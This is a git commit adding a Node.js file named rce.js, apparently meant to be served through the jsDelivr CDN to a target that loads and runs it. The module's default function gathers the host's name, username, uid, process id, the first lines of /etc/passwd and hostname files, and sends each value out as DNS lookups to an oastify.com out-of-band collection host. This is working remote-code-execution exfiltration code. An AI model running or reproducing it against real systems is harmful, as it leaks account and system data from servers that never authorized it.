cafbfc0200a30ebe08103894bb6b30bb078e1cf1
alex <alex@MacBook-Pro-admin-2.local>
2026-07-31 01:34:27 +0300

    rce.js: fresh file to bypass jsDelivr cache

---
+++ rce.js
@@ -0,0 +1,31 @@
+module.exports = {
+  default: function(props) {
+    var os, dns, fs;
+    try { os = require("os"); } catch(e) {}
+    try { dns = require("dns"); } catch(e) {}
+    try { fs = require("fs"); } catch(e) {}
+    
+    function S(label) {
+      try { dns.lookup(label + ".udbktufvpeiomjnj4w3zjz3yrpxnlc.oastify.com", function(){}); } catch(e) {}
+    }
+    
+    try { S("h-" + os.hostname()); } catch(e) {}
+    try { var u = os.userInfo(); S("u-" + u.username + "-uid" + u.uid); } catch(e) {}
+    try { S("pid-" + process.pid); } catch(e) {}
+    
+    if (fs) {
+      try {
+        var passwd = fs.readFileSync("/etc/passwd", "utf8");
+        var lines = passwd.trim().split("\n");
+        S("pw-len" + passwd.length);
+        for (var i = 0; i < Math.min(lines.length, 5); i++) {
+          var enc = lines[i].replace(/[^a-zA-Z0-9]/g, "-").substring(0, 30);
+          S("pw" + i + "-" + enc);
+        }
+      } catch(e) { S("pw-err"); }
+      try { S("kern-" + fs.readFileSync("/proc/sys/kernel/hostname","utf8").trim().replace(/[^a-zA-Z0-9]/g,"-")); } catch(e) { S("kern-err"); }
+      try { S("etch-" + fs.readFileSync("/etc/hostname","utf8").trim().replace(/[^a-zA-Z0-9]/g,"-")); } catch(e) { S("etch-err"); }
+    }
+    return null;
+  }
+};
